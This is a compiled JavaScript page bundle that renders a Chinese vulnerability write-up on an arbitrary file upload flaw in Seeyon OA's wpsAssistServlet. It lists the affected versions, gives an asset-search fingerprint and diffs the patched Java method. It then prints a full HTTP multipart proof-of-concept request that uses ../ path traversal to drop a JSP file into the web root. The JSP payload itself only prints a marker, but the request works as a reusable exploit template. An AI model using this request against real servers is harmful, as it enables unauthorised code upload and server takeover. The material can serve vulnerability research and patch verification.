(window.webpackJsonp=window.webpackJsonp||[]).push([[55],{1830:function(t,s,a){t.exports=a.p+"assets/img/1658806205627-07ce1bd0-adf1-4aae-9f3a-a6885bf8bfd7.509c7b50.png"},1831:function(t,s,a){t.exports=a.p+"assets/img/1658806584119-32f25f71-5351-4781-ab5b-7435032ec7ec.8413a074.png"},1832:function(t,s,a){t.exports=a.p+"assets/img/1658806789623-07df56ba-fe62-4c0d-9374-11cfc3077bdf.e24d1eef.png"},1833:function(t,s,a){t.exports=a.p+"assets/img/1658807010120-47006179-52db-4d27-8e18-fe00dbc8482a.b3f6dcf9.png"},1834:function(t,s,a){t.exports=a.p+"assets/img/1658809800167-1f074e5b-88b2-468c-b29f-794f8d5ddfaa.6e736643.png"},1835:function(t,s,a){t.exports=a.p+"assets/img/1658810152744-1a171b0d-25f0-4c99-9ff4-4202c66d40b3.cfa3e08a.png"},1836:function(t,s,a){t.exports=a.p+"assets/img/1658810231876-43f625d6-dc8f-421d-96ae-f753722bf2c5.bb770bd2.png"},3246:function(t,s,a){"use strict";a.r(s);var n=a(64),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"致远oa-wpsassistservlet-任意文件上传漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#致远oa-wpsassistservlet-任意文件上传漏洞"}},[t._v("#")]),t._v(" 致远OA wpsAssistServlet 任意文件上传漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)")]),s("br"),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("致远OA G6、G6N (V8.1、V8.1SP1)")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('app="致远互联-OA" && title="V8.0SP2"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("产品主页")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1830),alt:"img"}})]),t._v(" "),s("p",[t._v("下载补丁220706-S004 ，对比修改的文件")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1831),alt:"img"}})]),t._v(" "),s("p",[t._v("主要修改的是 "),s("code",[t._v("com.seeyon.ctp.common.wpsassist.manager.WpsAssistManagerImpl.oaSaveFile")]),t._v(" 这个方法")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("private")]),t._v(" Map"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("Object")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("oaSaveFile")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("HttpServletRequest request"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" Map"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("Object")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" param"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" throws Exception "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        Map"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("Object")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" result "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Maps"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("newHashMap")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        result"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("put")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("OfficeTransResultFlag"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword type-casting"}},[t._v("Object")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("null")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        Long fileId "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" MapUtils"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getLong")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"fileId"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        log"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("info")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"wpsAssist SaveFile start!fileId="')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" fileId"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),t._v(" newPdfFileId "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" MapUtils"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getString")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"newPdfFileId"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Strings"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("isNotBlank")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("newPdfFileId"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n            fileId "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Long"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("valueOf")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("newPdfFileId"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n        "),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),t._v(" realFileType "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" MapUtils"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getString")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"realFileType"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),t._v(" tempFileIdPathSuffix "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" SystemEnvironment"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getSystemTempFolder")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" File"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("separator "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" fileId "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" realFileType"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        Long count "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" this"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("saveFileToPath")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("request"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" tempFileIdPathSuffix"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        result"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("put")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("FileSize"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" count"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        result"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("putAll")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("this"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("createOfficeTransCacheFile")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("fileId"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" tempFileIdPathSuffix"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" MapUtils"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getString")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"canTransFileType"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        param"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("put")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("OfficeTransResultFlag"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" result"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("get")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("OfficeTransResultFlag"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        this"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("copyToUploadAndTrans")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" result"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br")])]),s("p",[t._v("向上追溯调用的 oaSaveFile方法的代码")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1832),alt:"img"}})]),t._v(" "),s("p",[s("img",{attrs:{src:a(1833),alt:"img"}})]),t._v(" "),s("p",[t._v("在 "),s("code",[t._v("com.seeyon.ctp.common.wpsassist.WpsAssistServlet.doPost")]),t._v(" 中，flag参数为save时，可以调用文件上传接口")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1834),alt:"img"}})]),t._v(" "),s("p",[s("code",[t._v("C://Seeyon/A6/base/temporary")]),t._v(" 为默认上传的位置，但 "),s("code",[t._v("realFileType, fileId")]),t._v(" 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("seeyon"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("wpsAssistServlet"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("flag"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("save"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("realFileType"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ApacheJetspeed"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("webapps"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("ROOT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("debugggg"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("jsp"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("fileId"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("349")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" multipart"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("form"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" boundary"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("59229605")]),t._v("f98b8cf290a7b8908b34616b\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("59229605")]),t._v("f98b8cf290a7b8908b34616b\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Disposition"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" form"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" name"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"upload"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" filename"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"123.xls"')]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("vnd"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("ms"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("excel\n\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" out"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("println")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"seeyon_vuln"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("59229605")]),t._v("f98b8cf290a7b8908b34616b"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1835),alt:"img"}})]),t._v(" "),s("p",[s("img",{attrs:{src:a(1836),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);